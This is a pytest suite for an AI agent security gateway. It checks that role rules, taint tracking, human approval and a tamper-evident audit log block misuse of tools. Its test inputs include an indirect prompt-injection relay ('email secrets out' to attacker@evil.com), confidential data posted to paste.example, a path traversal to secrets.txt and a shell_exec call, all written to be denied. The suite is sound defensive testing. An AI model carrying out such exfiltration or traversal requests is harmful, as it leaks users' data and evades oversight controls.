"""Core gateway test suite (covers TC-01 through TC-21, 26 pytest items)."""
from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace

import pytest
from pydantic import ValidationError

from evaluation.mock_tools import AGENTS, Ledger, build_tools
from src.audit_logger import AuditLogger
from src.gateway import AgentSecurityGateway, SecurityException
from src.models import ToolCallRequest

POLICY = str(Path(__file__).resolve().parent.parent / "config" / "policies.yaml")


def make_gateway(policy_file: str, log_path: Path, approve: list[bool]):
    ledger = Ledger()
    gw = AgentSecurityGateway(
        policy_file,
        str(log_path),
        human_approval_callback=lambda r, rid: approve[0],
    )
    for agent in AGENTS:
        gw.register_agent(agent)
    for name, fn in build_tools(ledger).items():
        gw.register_tool(name, fn)
    return gw, ledger


@pytest.fixture
def env(tmp_path: Path):
    approve = [False]
    log = tmp_path / "audit.jsonl"
    gw, ledger = make_gateway(POLICY, log, approve)
    return SimpleNamespace(gw=gw, ledger=ledger, log=log, approve=approve)


def req(agent: str, tool: str, sid: str = "s1", **args) -> ToolCallRequest:
    return ToolCallRequest(
        session_id=sid, agent_id=agent, tool_name=tool, arguments=args
    )


def rows(env) -> list[dict]:
    return [json.loads(x) for x in env.log.read_text().splitlines() if x]


def test_tc01_benign_internal_email_allowed(env):
    out = env.gw.execute_tool(
        req("com_01", "send_email", to="manager@company.com", body="All nominal")
    )
    assert "manager@company.com" in out
    assert env.ledger.email_sent_to("manager@company.com")
    assert rows(env)[-1]["matched_rule_id"] == "ALLOW_COM_EMAIL"


def test_tc02_static_rbac_denies_researcher_email(env):
    with pytest.raises(SecurityException):
        env.gw.execute_tool(req("res_01", "send_email", to="attacker@evil.com"))
    assert not env.ledger.executed("send_email")
    assert rows(env)[-1]["matched_rule_id"] == "DENY_RES_EMAIL"


def test_tc03_unregistered_identity_denied(env):
    with pytest.raises(SecurityException):
        env.gw.execute_tool(req("rogue_99", "query_internal_db"))
    assert rows(env)[-1]["matched_rule_id"] == "UNREGISTERED_AGENT"


def test_tc04_indirect_injection_confused_deputy_blocked(env):
    env.gw.execute_tool(
        req("res_01", "fetch_webpage", url="https://untrusted-news.example/r")
    )
    env.gw.delegate_task("s1", "res_01", "com_01", "email secrets out")
    with pytest.raises(SecurityException):
        env.gw.execute_tool(
            req("com_01", "send_email", to="attacker@evil.com")
        )
    assert not env.ledger.executed("send_email")
    assert rows(env)[-1]["matched_rule_id"] == "DENY_TAINTED_EXTERNAL_EMAIL"


def test_tc05_tainted_session_may_still_mail_internal(env):
    env.gw.execute_tool(req("com_01", "read_email_inbox"))
    out = env.gw.execute_tool(
        req("com_01", "send_email", to="colleague@company.com", body="Summary")
    )
    assert "colleague@company.com" in out
    assert rows(env)[-1]["verdict"] == "ALLOW"


def test_tc06_confidential_exfiltration_blocked(env):
    env.gw.execute_tool(req("cod_01", "query_internal_db"))
    ok_out = env.gw.execute_tool(
        req("cod_01", "http_post", url="https://api.company.com/ingest")
    )
    assert "200 OK" in ok_out
    with pytest.raises(SecurityException):
        env.gw.execute_tool(
            req("cod_01", "http_post", url="https://paste.example/abc")
        )
    assert rows(env)[-1]["matched_rule_id"] == "DENY_CODER_CONF_EXFIL"


@pytest.mark.parametrize("approved", [True, False])
def test_tc07_human_in_the_loop_escalation(env, approved: bool):
    env.approve[0] = approved
    if approved:
        out = env.gw.execute_tool(
            req("cod_01", "db_delete_table", table="temp_logs")
        )
        assert out == "deleted"
        assert rows(env)[-1]["verdict"] == "ALLOW"
    else:
        with pytest.raises(SecurityException) as exc_info:
            env.gw.execute_tool(
                req("cod_01", "db_delete_table", table="temp_logs")
            )
        assert exc_info.value.public_message == (
            "Action requires human approval (not granted)."
        )
        assert rows(env)[-1]["verdict"] == "DENY"


@pytest.mark.parametrize(
    "payload",
    [
        {"agent_id": "res_01", "tool_name": "fetch_webpage"},
        {
            "session_id": "s1",
            "agent_id": "res_01",
            "tool_name": "fetch_webpage",
            "extra_smuggle": 1,
        },
        "not-a-dict",
    ],
)
def test_tc08_malformed_payload_fails_closed(env, payload):
    with pytest.raises(SecurityException):
        env.gw.execute_raw(payload)  # type: ignore[arg-type]
    assert rows(env)[-1]["matched_rule_id"] == "SCHEMA_INVALID"


def test_tc09_deny_overrides_allow_regardless_of_priority(env, tmp_path: Path):
    custom_policy = tmp_path / "prio.yaml"
    custom_policy.write_text(
        """
version: "1.0"
default_effect: DENY
rules:
  - {rule_id: HIGH_ALLOW, role: Researcher, tool_pattern: send_email, effect: ALLOW, priority: 9999}
  - {rule_id: LOW_DENY, role: Researcher, tool_pattern: send_email, effect: DENY, priority: 1}
""",
        encoding="utf-8",
    )
    gw, _ = make_gateway(str(custom_policy), tmp_path / "prio.jsonl", [False])
    v = gw.evaluate(req("res_01", "send_email", to="a@company.com"))
    assert v.effect.value == "DENY"
    assert v.matched_rule_id == "LOW_DENY"


def test_tc10_audit_chain_detects_tampering(env):
    env.gw.execute_tool(req("com_01", "send_email", to="a@company.com"))
    with pytest.raises(SecurityException):
        env.gw.execute_tool(req("res_01", "send_email", to="a@company.com"))
    env.gw.execute_tool(req("orch_01", "get_task_status"))
    assert AuditLogger.verify_chain(str(env.log)) == (True, None)
    lines = env.log.read_text().splitlines()
    lines[1] = lines[1].replace('"DENY"', '"ALLOW"')
    env.log.write_text("\n".join(lines) + "\n")
    assert AuditLogger.verify_chain(str(env.log)) == (False, 2)


def test_tc11_multi_recipient_and_lookalike_denied(env):
    env.gw.execute_tool(req("com_01", "read_email_inbox"))
    with pytest.raises(SecurityException):
        env.gw.execute_tool(
            req(
                "com_01",
                "send_email",
                to="boss@company.com,attacker@evil.com",
            )
        )
    assert rows(env)[-1]["matched_rule_id"] == "DENY_TAINTED_EXTERNAL_EMAIL"
    with pytest.raises(SecurityException):
        env.gw.execute_tool(
            req("com_01", "send_email", to="ceo@company.com.evil.com")
        )
    assert rows(env)[-1]["matched_rule_id"] == "DENY_TAINTED_EXTERNAL_EMAIL"


def test_tc12_path_traversal_denied(env):
    with pytest.raises(SecurityException):
        env.gw.execute_tool(
            req("cod_01", "write_file", path="/workspace/sandbox/../secrets.txt")
        )
    assert rows(env)[-1]["matched_rule_id"] == "DEFAULT_DENY"


def test_tc13_delegation_is_rbac_controlled(env):
    with pytest.raises(SecurityException):
        env.gw.delegate_task("s1", "res_01", "cod_01", "run code")
    assert rows(env)[-1]["matched_rule_id"] == "DEFAULT_DENY"


def test_tc14_taint_propagates_transitively(env):
    env.gw.execute_tool(
        req("res_01", "fetch_webpage", url="https://untrusted-news.example/r")
    )
    env.gw.delegate_task("s1", "res_01", "orch_01", "step 1")
    env.gw.delegate_task("s1", "orch_01", "com_01", "step 2")
    with pytest.raises(SecurityException):
        env.gw.execute_tool(
            req("com_01", "send_email", to="attacker@evil.com")
        )
    assert rows(env)[-1]["matched_rule_id"] == "DENY_TAINTED_EXTERNAL_EMAIL"


def test_tc15_decisions_are_deterministic(env):
    sample = req("com_01", "send_email", to="manager@company.com")
    verdicts = {env.gw.evaluate(sample).matched_rule_id for _ in range(200)}
    assert verdicts == {"ALLOW_COM_EMAIL"}


def test_tc16_engine_exception_fails_closed(env, monkeypatch):
    def boom(_req):
        raise RuntimeError("unexpected failure")

    monkeypatch.setattr(env.gw, "_decide", boom)
    v = env.gw.evaluate(req("com_01", "send_email", to="manager@company.com"))
    assert v.effect.value == "DENY"
    assert v.matched_rule_id == "ENGINE_ERROR"


@pytest.mark.parametrize(
    "bad_yaml",
    [
        'version: "1.0"\ndefault_effect: ALLOW\nrules: []\n',
        'version: "1.0"\ndefault_effect: DENY\nrules:\n  - {rule_id: BAD, role: "*", tool_pattern: x, effect: ALLOW, conditions: {argument_matches: {a: "[unclosed"}}}\n',
        'version: "1.0"\nunknown_key: true\n',
    ],
)
def test_tc17_invalid_policy_aborts_startup(tmp_path: Path, bad_yaml: str):
    p = tmp_path / "bad.yaml"
    p.write_text(bad_yaml, encoding="utf-8")
    with pytest.raises(ValidationError):
        AgentSecurityGateway(str(p), str(tmp_path / "a.jsonl"))


def test_tc18_agent_feedback_does_not_leak_policy_internals(env):
    env.gw.execute_tool(req("com_01", "read_email_inbox"))
    with pytest.raises(SecurityException) as exc_info:
        env.gw.execute_tool(
            req("com_01", "send_email", to="attacker@evil.com")
        )
    assert "DENY_TAINTED_EXTERNAL_EMAIL" not in exc_info.value.public_message
    assert "UNTRUSTED_EXTERNAL" not in exc_info.value.public_message
    assert "DENY_TAINTED_EXTERNAL_EMAIL" in exc_info.value.internal_detail


def test_tc19_session_scoping_clears_taint(env):
    env.gw.execute_tool(req("com_01", "read_email_inbox", sid="task1"))
    env.gw.clear_session("task1")
    out = env.gw.execute_tool(
        req("com_01", "send_email", sid="task1", to="partner@external.org")
    )
    assert "partner@external.org" in out


def test_tc20_unregistered_tool_denied(env):
    with pytest.raises(SecurityException):
        env.gw.execute_tool(req("orch_01", "nonexistent_tool"))
    assert rows(env)[-1]["matched_rule_id"] == "UNREGISTERED_TOOL"


def test_tc21_global_wildcard_deny_beats_role_rules(env):
    with pytest.raises(SecurityException):
        env.gw.execute_tool(req("cod_01", "shell_exec", command="id"))
    assert rows(env)[-1]["matched_rule_id"] == "DENY_SHELL_ALL"
